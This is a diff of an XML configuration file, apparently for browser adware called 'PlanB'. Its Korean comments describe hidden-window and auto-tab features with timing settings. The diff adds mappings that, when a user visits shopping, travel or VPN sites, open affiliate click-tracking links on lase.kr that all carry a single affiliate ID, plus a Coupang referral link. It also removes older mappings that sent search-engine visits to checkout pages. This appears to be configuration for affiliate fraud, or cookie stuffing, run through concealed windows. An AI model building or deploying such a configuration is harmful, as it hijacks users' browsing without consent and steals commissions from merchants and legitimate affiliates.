@@ -1,60 +1,123 @@
 <?xml version="1.0" encoding="utf-8"?>
+<!-- PlanB 기능명세서 V1.4 기준 -->
 <config>
+	<!-- 전역 제어: on=전체 기능 중지, off=정상 작동 -->
 	<forcedown>off</forcedown>
+
+	<!-- 탭브라우저 기능 -->
 	<autotab>on</autotab>
-	<autotab_cycletime>1800</autotab_cycletime>
+	<autotab_cycletime>3600</autotab_cycletime>
+
+	<!-- 히든윈도우 기능 -->
 	<openhd>on</openhd>
-	<openhd_closetime>10</openhd_closetime>
+	<openhd_delaytime>190</openhd_delaytime>
+	<openhd_closetime>300</openhd_closetime>
 	<openhd_cycletime>1800</openhd_cycletime>
+
 	<mappings>
 		<map>
-			<trigger>search.daum.net</trigger>
-			<target>checkout.coupang.com</target>
-			<frequency>2</frequency>
-		</map>
-		<map>
-			<trigger>daum.net</trigger>
-			<target>checkout.coupang.com</target>
-			<frequency>2</frequency>
-		</map>
-		<map>
-			<trigger>search.naver.com</trigger>
-			<target>www.agoda.com/ko-kr/book</target>
-			<frequency>2</frequency>
-		</map>
-		<map>
-			<trigger>naver.com</trigger>
-			<target>temu.com</target>
-			<frequency>5</frequency>
-		</map>
-		<map>
-			<trigger>google.com</trigger>
-			<target>kr.trip.com/hotels/booknew</target>
+			<trigger>agoda.com</trigger>
+			<target>lase.kr/click.php?m=agoda&amp;a=A100637853&amp;l=0000</target>
 			<frequency>1</frequency>
 		</map>
 		<map>
-			<trigger>search.google.com</trigger>
-			<target>kr.trip.com/hotels/booknew</target>
+			<trigger>gmarket.co.kr</trigger>
+			<target>lase.kr/click.php?m=gmarket&amp;a=A100637853&amp;l=0000</target>
 			<frequency>1</frequency>
 		</map>
 		<map>
-			<trigger>bing.com</trigger>
-			<target>www.agoda.com/ko-kr/book</target>
+			<trigger>yes24.com</trigger>
+			<target>lase.kr/click.php?m=yes24&amp;a=A100637853&amp;l=0000</target>
 			<frequency>1</frequency>
 		</map>
 		<map>
-			<trigger>search.bing.com</trigger>
-			<target>www.agoda.com/ko-kr/book</target>
+			<trigger>e-himart.co.kr</trigger>
+			<target>lase.kr/click.php?m=himart&amp;a=A100637853&amp;l=0000</target>
 			<frequency>1</frequency>
 		</map>
 		<map>
-			<trigger>youtube.com</trigger>
-			<target>www.yes24.com/Templates/FTLogin.aspx</target>
+			<trigger>kyobobook.co.kr</trigger>
+			<target>lase.kr/click.php?m=kbbook&amp;a=A100637853&amp;l=0000</target>
 			<frequency>1</frequency>
 		</map>
 		<map>
-			<trigger>search.youtube.com</trigger>
-			<target>www.yes24.com/Templates/FTLogin.aspx</target>
+			<trigger>lotteon.com</trigger>
+			<target>lase.kr/click.php?m=lotteon&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>auction.co.kr</trigger>
+			<target>lase.kr/click.php?m=auction&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>soomgo.com</trigger>
+			<target>lase.kr/click.php?m=soomgo&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>klook.com</trigger>
+			<target>lase.kr/click.php?m=klook&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>11st.co.kr</trigger>
+			<target>lase.kr/click.php?m=11st&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>interpark.com</trigger>
+			<target>lase.kr/click.php?m=interpark3&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>expedia.co.kr</trigger>
+			<target>lase.kr/click.php?m=expedia&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>99flower.co.kr</trigger>
+			<target>lase.kr/click.php?m=99flower&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>mootoon.co.kr</trigger>
+			<target>lase.kr/click.php?m=mootoon&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>tstation.com</trigger>
+			<target>lase.kr/click.php?m=tstation&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>ttang.com</trigger>
+			<target>lase.kr/click.php?m=072com&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>expressvpn.com</trigger>
+			<target>lase.kr/click.php?m=exvpn&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>credit.co.kr</trigger>
+			<target>lase.kr/click.php?m=mycredit1&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>hotelscombined.co.kr</trigger>
+			<target>lase.kr/click.php?m=hcombine2&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>nordvpn.com</trigger>
+			<target>lase.kr/click.php?m=nordvpn2&amp;a=A100637853&amp;l=0000</target>
+			<frequency>1</frequency>
+		</map>
+		<map>
+			<trigger>coupang.com</trigger>
+			<target>link.coupang.com/a/ded2ab</target>
 			<frequency>1</frequency>
 		</map>
 	</mappings>
